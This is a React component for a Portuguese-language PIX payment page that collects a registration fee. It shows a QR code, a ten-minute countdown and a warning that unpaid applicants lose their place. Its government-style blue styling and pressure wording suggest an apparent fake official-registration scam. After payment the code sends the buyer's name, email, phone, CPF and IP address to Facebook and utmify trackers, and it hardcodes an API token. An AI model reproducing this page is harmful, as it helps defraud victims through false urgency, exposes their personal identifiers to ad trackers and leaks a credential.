import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import useUtmNavigator from '../hooks/useUtmNavigator';
import { useUser } from "../context/UserContext";
import { getPaymentToken } from "../utils/paymentToken";
import QRious from "qrious";
import ReactPixel from "react-facebook-pixel";
import { hashUserData } from "../utils/pixel";
import moment from "moment";
import { usePixelTracking } from '../hooks/usePixelTracking';

const PixPayment: React.FC = () => {
	usePixelTracking();
	
	const [timeLeft, setTimeLeft] = useState(600); // 10 minutes in seconds
	const [copied, setCopied] = useState(false); 
	const navigate = useUtmNavigator();
	const location = useLocation();

	const { transactionData } = useUser();

	useEffect(() => {
		const timer = setInterval(() => {
			setTimeLeft((prev) => {
				if (prev <= 1) {
					clearInterval(timer);
					return 0;
				}
				return prev - 1;
			});
		}, 1000);

		return () => clearInterval(timer);
	}, []);

	useEffect(() => {
		const timer = setInterval(async () => {
			try {
				const response = await fetch(
					"https://api.novaera-pagamentos.com/api/v1/transactions/" + transactionData.transactionId,
					{
						headers: {
							Authorization: getPaymentToken(),
						},
					},
				);

				const body = await response.json();

				if (body.data && body.data.status === "paid") {
					ReactPixel.init("617874301266607");

					ReactPixel.track("Purchase", {
						event_name: "Purchase",
						event_time: Math.floor(Date.now() / 1000),
						event_id: "Purchase_" + (body.data.id || Date.now()),
						user_data: hashUserData(
							{
								...body.data.customer,
								cpf: body.data.customer.document.number,
							} || {},
						),
						value: body.data.amount / 100,
						custom_data: {
							content_name: "Pagamento",
							content_ids: Date.now(),
							currency: "BRL",
							num_items: 1,
							user: {
								...body.data.customer,
								cpf: body.data.customer.document.number,
							},
							order_id: body.data.id,
							contents: [
								{
									quantity: 1,
									item_price: body.data.amount / 100,
								},
							],
						},
					});

					const ipResponse = await fetch("https://api.ipify.org?format=json").then((response) => response.json());

					const query = new URLSearchParams(location.search);

					await fetch("https://api.utmify.com.br/api-credentials/orders", {
						method: "POST",
						headers: {
							"Content-Type": "application/json",
							"x-api-token": "joDLXCBh6zMWyAf2F174pNJ3VrbQWa47cLq7",
						},
						body: JSON.stringify({
							orderId: body.data.id,
							platform: "GlobalPay",
							paymentMethod: "pix",
							status: "paid",
							createdAt: moment().utc(0).format("YYYY-MM-DD HH:mm:ss"), // "Y-m-d H:i:s"
							approvedDate: moment().utc(0).format("YYYY-MM-DD HH:mm:ss"),
							refundedAt: null,
							customer: {
								name: body.data.customer.name,
								email: body.data.customer.email,
								phone: body.data.customer.phone,
								document: body.data.customer.document.number
									.replace(".", "")
									.replace(".", "")
									.replace("-", ""),
								country: "BR",
								ip: ipResponse.ip,
							},
							products: [
								{
									id: "sdf12-sdf51-4c7b-sdf21-dsf65sd1651",
									name: "Inscrição",
									planId: null,
									planName: null,
									quantity: 1,
									priceInCents: body.data.amount,
								},
							],
							trackingParameters: {
								src: null,
								sck: null,
								utm_source: query.get("utm_source"),
								utm_campaign: query.get("utm_campaign") ?? "ADS 03 G 17",
								utm_medium: query.get("utm_medium"),
								utm_content: query.get("utm_content"),
								utm_term: query.get("utm_term"),
							},
							commission: {
								totalPriceInCents: body.data.amount,
								gatewayFeeInCents: body.data.amount,
								userCommissionInCents: body.data.amount,
							},
							isTest: false,
						}),
					});

					navigate("/sucesso");
				}
			} catch (error) {
				console.error("Error checking payment status:", error);
			}
		}, 3 * 1000);

		return () => clearInterval(timer);
	}, []);

	useEffect(() => {
		setTimeout(() => {
			new QRious({
				element: document.getElementById("qrcode"),
				value: transactionData.qrcode,
				size: 250,
			});
		}, 2000);
	}, []);

	const formatTime = (seconds: number) => {
		const minutes = Math.floor(seconds / 60);
		const remainingSeconds = seconds % 60;
		return `${String(minutes).padStart(2, "0")}:${String(remainingSeconds).padStart(2, "0")}`;
	};

	const handleCopyPix = () => {
		navigator.clipboard.writeText(transactionData.qrCode);
		setCopied(true);
		setTimeout(() => setCopied(false), 2000);
	};

	return (
		<div className="max-w-lg mx-auto px-4 py-8">
			<div className="bg-white rounded-lg p-6">
				<h2 className="text-lg font-medium text-[#1351B4] mb-4">Pagamento via PIX</h2>

				<div className="bg-blue-5 p-2 rounded-lg mb-4">
					<p className="text-sm text-blue-700">
						Para concluir sua inscrição, escaneie o QR Code ou copie o código PIX abaixo
					</p>
				</div>

				<div className="mb-4">
					<div className="flex items-center justify-between mb-2">
						<span className="text-gray-700">Tempo restante:</span>
						<span className="text-orange-500">{formatTime(timeLeft)}</span>
					</div>
					<div className="h-2 bg-blue-600 rounded-full"></div>
				</div>

			<div className="flex justify-center mb-6"> 
					<canvas className="w-64 h-64" id="qrcode" />
				</div>

				<button
					className="w-full bg-[#1351B4] text-white py-3 rounded-lg mb-2 hover:bg-[#1351B4]/90 transition-colors flex items-center justify-center gap-2 text-center"
					onClick={() => {}}
				>
					<div>
						<div>Escaneie este QR Code</div>
						<div>com seu aplicativo bancário</div>
					</div>
				</button> 

				<div className="text-center mb-6">
					<p className="text-gray-600 mb-2">Ou use o código PIX:</p>
					<div className="bg-gray-50 p-3 rounded-lg mb-3 break-all text-sm">
						{transactionData.qrCode.substring(0, transactionData.qrCode.toLowerCase().indexOf("bcb") + 3) +
							"..."}
					</div>
					<button
						onClick={handleCopyPix}
						className="w-full bg-[#1351B4] text-white py-3 rounded-lg hover:bg-[#1351B4]/90 transition-colors"
					>
						{copied ? "Código PIX Copiado!" : "Copiar código PIX"}
					</button>
				</div>

				<div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
					<p className="text-sm text-yellow-800">
						<strong>AVISO:</strong> O não pagamento da Taxa de Inscrição resultará na perda da vaga. Efetue
						o pagamento em até 10 minutos para evitar o cancelamento do processo.
					</p>
				</div>

				<div className="space-y-4">
					<h3 className="font-medium">Instruções:</h3>
					<ol className="list-decimal pl-4 space-y-2">
						<li className="text-sm text-gray-600">Abra o app ou site do seu banco</li>
						<li className="text-sm text-gray-600">Escolha pagar com Pix</li>
						<li className="text-sm text-gray-600">Escaneie o QR code ou cole o código Pix</li>
						<li className="text-sm text-gray-600">Confirme as informações e finalize o pagamento</li>
					</ol>
				</div>
			</div>
		</div>
	);
};

export default PixPayment;